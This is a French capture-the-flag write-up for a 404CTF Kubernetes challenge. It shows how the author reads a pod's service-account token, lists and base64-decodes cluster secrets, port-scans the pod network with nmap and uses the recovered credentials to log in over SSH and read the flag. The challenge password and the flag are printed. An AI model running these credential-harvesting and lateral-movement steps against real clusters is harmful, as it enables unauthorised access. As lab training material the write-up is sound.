# Introduction

```
Les nuages menaçants 2/3

Après avoir trouvé les secrets du nuage, vous les racontez à Proust. Celui-ci vous demande alors d'aller
explorer le nuage plus en profondeur.
 
Connectez-vous au nuage avec le mot de passe suivant : 4GqWrNkNuN
Le challenge peut prendre quelques minutes à se lancer.
Le flag est dans /flag.txt.
```


## Challenge

## Solution

Si on affiche l'environnement :

```sh
$ env
# ...
KUBERNETES_SERVICE_PORT_HTTPS=443                                                                        
KUBERNETES_SERVICE_PORT=443
HOSTNAME=start
CACERT=/var/run/secrets/kubernetes.io/serviceaccount/ca.crt
PWD=/
NAMESPACE=default
HOME=/root
KUBERNETES_PORT_443_TCP=tcp://10.43.0.1:443
KUBERNETES_PORT_443_TCP_PROTO=tcp
KUBERNETES_PORT_443_TCP_ADDR=10.43.0.1
SERVICEACCOUNT=/var/run/secrets/kubernetes.io/serviceaccount
KUBERNETES_SERVICE_HOST=10.43.0.1
KUBERNETES_PORT=tcp://10.43.0.1:443
KUBERNETES_PORT_443_TCP_PORT=443
APISERVER=10.43.0.1:443
# ...
```

Initialiser son accès à l'API :

```sh
export APISERVER=${KUBERNETES_SERVICE_HOST}:${KUBERNETES_SERVICE_PORT_HTTPS}
export SERVICEACCOUNT=/var/run/secrets/kubernetes.io/serviceaccount
export TOKEN=$(cat ${SERVICEACCOUNT}/token)
export CACERT=${SERVICEACCOUNT}/ca.crt
alias kurl="curl --cacert ${CACERT} --header \"Authorization: Bearer ${TOKEN}\""
# kube api info (cidr and services ips)
kurl -v https://$APISERVER/api
# lister ses permissions depuis le pod
kurl -i -s -k -X $'POST' \
    -H $'Content-Type: application/json' \
    --data-binary $'{\"kind\":\"SelfSubjectRulesReview\",\"apiVersion\":\"authorization.k8s.io/v1\",\"metadata\":{\"creationTimestamp\":null},\"spec\":{\"namespace\":\"default\"},\"status\":{\"resourceRules\":null,\"nonResourceRules\":null,\"incomplete\":false}}\x0a' \
    "https://$APISERVER/apis/authorization.k8s.io/v1/selfsubjectrulesreviews"
#> permissions ...
```

En listant les droits, on remarque qu'on ne peut que lister les secrets. On trouve notamment dans le 
namespace `404ctf` :

```sh
kurl -v https://$APISERVER/api/v1/secrets/
# ...        
#      "data": {                                                                                          
#        "password": "bGVzX251YWdlcw==",
#        "user": "cHJvdXN0" 
#      },       
#      "type": "Opaque"
# ... 
```

En décodant en base64, cela donne :

```
password: les_nuages
user: proust
```

Cela donne forcément accès à quelque chose ! Mais quoi ?
Après de nombreux autres essais via l'API server, on ne trouve pas grand chose. Sl faut tenter autre 
chose.

En lisant les binaires, on trouve `nmap`. Intéressant !
En listant les interfaces :

```sh
$ ip r
default via 10.42.0.1 dev eth0                                                                           
10.42.0.0/24 dev eth0 proto kernel scope link src 10.42.0.14              
10.42.0.0/16 via 10.42.0.1 dev eth0
```

Utiliser `nmap` sur 10.42.0.0/16 en cherchant les connexions tcp et sur les ports kubernetes en suivant 
les informations de :

- https://cloud.hacktricks.xyz/pentesting-cloud/kubernetes-security/pentesting-kubernetes-services#finding-exposed-pods-via-port-scanning

```sh
#nmap -n -T4 -p 443,2379,6666,4194,6443,8443,8080,10250,10255,10256,9099,6782-6784,30000-32767,44134 <pod_ipaddress>/16
nmap -n -T4 -p 443,2379,6666,4194,6443,8443,8080,10250,10255,10256,9099,6782-6784,30000-32767,44134 10.42.0.0/16

Starting Nmap 7.80 ( https://nmap.org ) at 2023-05-24 22:55 UTC                                          
Nmap scan report for 10.42.0.0 
Host is up (0.0015s latency). 
Not shown: 2780 filtered ports                      
PORT      STATE SERVICE
443/tcp   open  https                               
31301/tcp open  unknown                             
32623/tcp open  unknown   
MAC Address: 62:AB:D4:B0:52:9C (Unknown)

Nmap scan report for 10.42.0.1
Host is up (0.00073s latency).
Not shown: 2778 closed ports
PORT      STATE SERVICE
443/tcp   open  https
6443/tcp  open  sun-sr-https
10250/tcp open  unknown
31301/tcp open  unknown
32623/tcp open  unknown
MAC Address: 62:AB:D4:B0:52:9C (Unknown)

# All 2783 scanned ports on 10.42.0.11 are closed

Nmap scan report for 10.42.0.12
Host is up (0.00080s latency).
Not shown: 2782 closed ports
PORT      STATE SERVICE
10250/tcp open  unknown
MAC Address: E6:68:C6:A0:02:2E (Unknown)

# All 2783 scanned ports on 10.42.0.13 are closed
# All 2783 scanned ports on 10.42.0.15 are closed

Nmap scan report for 10.42.0.16
Host is up (0.00083s latency).
Not shown: 2782 closed ports
PORT     STATE SERVICE
8443/tcp open  https-alt
MAC Address: BE:C1:93:CE:75:30 (Unknown)

Nmap scan report for 10.42.0.17
Host is up (0.00086s latency).
Not shown: 2782 closed ports
PORT    STATE SERVICE
443/tcp open  https
MAC Address: B2:A7:92:99:00:3B (Unknown)
```

Tous ces services ont donné une erreur 404:

- http://10.42.0.1:31301 (NodePort)
- http://10.42.0.1:32623 (NodePort)
- http://10.42.0.16:8443 (Port-Forward)
- http://10.42.0.17:443 (exposed service ?)

Essayer plus large :

```sh
nmap -n -T4 10.42.0.0/16

Starting Nmap 7.80 ( https://nmap.org ) at 2023-05-24 23:35 UTC                                          
Nmap scan report for 10.42.0.0                                                                           
Host is up (0.0018s latency).
Not shown: 998 filtered ports
PORT    STATE SERVICE
80/tcp  open  http
443/tcp open  https
MAC Address: 62:AB:D4:B0:52:9C (Unknown)

Nmap scan report for 10.42.0.1
Host is up (0.00077s latency).
Not shown: 998 closed ports
PORT    STATE SERVICE
80/tcp  open  http
443/tcp open  https
MAC Address: 62:AB:D4:B0:52:9C (Unknown)

# All 2783 scanned ports on 10.42.0.11 are closed
# All 2783 scanned ports on 10.42.0.12 are closed

Nmap scan report for 10.42.0.13                                                                          
Host is up (0.00078s latency).                                                                           
Not shown: 999 closed ports                                                                              
PORT   STATE SERVICE                                                                                     
22/tcp open  ssh                                                                                         
MAC Address: 3A:48:4B:29:31:DB (Unknown)  

# All 2783 scanned ports on 10.42.0.15 are closed

Nmap scan report for 10.42.0.16
Host is up (0.00078s latency).
Not shown: 996 closed ports
PORT     STATE SERVICE
8000/tcp open  http-alt
8443/tcp open  https-alt
9000/tcp open  cslistener
9100/tcp open  jetdirect
MAC Address: BE:C1:93:CE:75:30 (Unknown)

Nmap scan report for 10.42.0.17
Host is up (0.00090s latency).
Not shown: 998 closed ports
PORT    STATE SERVICE
80/tcp  open  http
443/tcp open  https
MAC Address: B2:A7:92:99:00:3B (Unknown)
```

Il y a un port `22` sur 10.42.0.13 !!
Et ssh est installé sur le pod ... il faut essayer !

```sh
ssh root@10.42.0.13
> password:
```

Il faut un password que nous n'avons pas... peut être ceux trouvés précédemment ? :p

```sh
ssh proust@10.42.0.13
> password: ********** # les_nuages
```

Nous y sommes !
En accord avec les informations du challenges, il faut lire `/flag.txt`:

```sh
cat /flah.txt
404CTF{A_la_Recherche_De_La_Racine}
```

TADAAM !
